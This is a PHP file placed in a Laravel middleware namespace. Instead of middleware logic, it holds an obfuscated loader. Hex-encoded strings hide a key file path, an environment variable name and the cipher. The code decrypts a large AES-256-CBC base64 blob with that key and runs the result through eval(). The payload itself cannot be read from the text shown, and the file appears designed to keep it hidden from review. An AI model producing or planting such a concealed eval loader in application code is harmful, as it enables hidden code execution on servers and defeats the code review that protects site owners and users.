<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('qy0UUo1crIhVuGFD5gN9Nw==');

$c=base64_decode(

'jOugypN2d+z/pe0cKJz/4GSa8plfszW2wBxclZn5EWgbqzDrXsAiQJrsGQJf6GhGhqhW35bllPQt' .
'KjFtNLR7CbjQZKv8huca8DDAIKS6leBBd8GpP0UIZiFfhuMW5SlvSg7NIp1zY1wDvsAXF4gE1G8X' .
'dfb+3HjGxZG4kYrIRKWqCTHXGpGkONQYbglqcZPpgQR9TbG5EC4VoemvjvSrNMzuMz92AsZ9/YYG' .
'htGMUKilwM4xDtTeYwg07nxzB1Hp2Kh1+P2WUd6NGq7J7S+oODg57YgKMuHXQ0JLpuEewqQUZiY5' .
'zAdPldvJ5dmCUhEJ47MqYGQrYYnQZJ9tr8LjZtAqS70RSc4pFxaEqt4kH8qqIy5IOKTP/3OyR3Hg' .
'POS5gm5n0BP2wUl7nBnmN/GqA225V9UpzB6Tm4ksmlWPPIJwpdvZc5c7FVqZ8KWydR6xB4eoipqr' .
'N/7zPThxxpyKLmoOULJ23/Y0NrBd63byBaDlXHzEBSGaWga/n/t1O9aTvs2qhnz3B/anuEvQjWWA' .
'PxM7b69Op4XzwRQwoeW2WcntgIgpIgxQJu8V2GpY6Nus7K4+OHmv3c4ac/NHqnNjI6mtTYhYsTgK' .
'58WGiiIBAj3MtMkLpa7xoanAXCYUevxexSH3wkI5KiE6Fu5wCK2h9oheGuBq7b1Or9eFoSPxEJDK' .
'f/6RggZvl5yAUs8QNQXOyer/AT5/wjqatTUp6KBGCXLg/SbkQ+W9B3z1vZ/whjeRcnpjlMu68YVL' .
'o/QwW+2LP1vaw/KqS5d27QPZEPrK6mnpj8CfbRyGjduOP9D/OaYuaQn2SyTuJhWeLanaI1rIOVaN' .
'vAE2yFCGog9ASHi7E/L0qsR5YGmPcWEuyxqRGRm08dg+8awkoH7Yv3/SN0ouhzOvqF0GmRzB4Yes' .
'8/0dhEL+l3SsCnddbfD1mUqFUBntX8GPLAazU5kGYLsI3bAyVn97YpWMda3yKTtZoUtUrZ9jvSDh' .
'O4MPOz5zTbF14FBz6+M7YFKPbbP4g9f2VUpn8DB3uXUXfLpYzgaR/4ItRODSlOxQ580cBCDceQ/F' .
'lY3bHSeREsDpE1Mf3hhz9CjdFQtXfr5iNW3gRa1JaRDvFigYhsv+WRw3BlQtUveIdC3mEMNaYpXJ' .
'y06htE2J08p1S32LBywg1cefkqOODFg+IUWWYrW2ecSGd99tq66BPvub0nx38Ebk2JhnVKZ5a3Hi' .
'U+GOulUna8s/bLyaAqySufkEFtqysbyrmM9UAnonUPw8PCnSrVoInFcf/kjEA8Zwl5ujQFXdHTZa' .
'5IwTdIMli390wiF/qNjn2maLhBXh4NGAc9nRML3WVspN7EBNWhlfafpp3RQ2g5+ltdMBchXOridU' .
'71BGUVNMyp9MaxbDwRW6bPAhs4ybE9T9Ma3uLQhwbdV/XduVxXhyhRhwxTHP7bZqY4Jue5QYViMW' .
'x8zDz4rSdl+Z8U4lVYuKr7cJphcTpmVvzAsVOQ93BalXR5O9buREQP8+cGDU0xkOq2omr/xT4huH' .
'ffPsxU3uPyGSUIQPDAeAHrNeT/rMB3kSfHy9Gg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

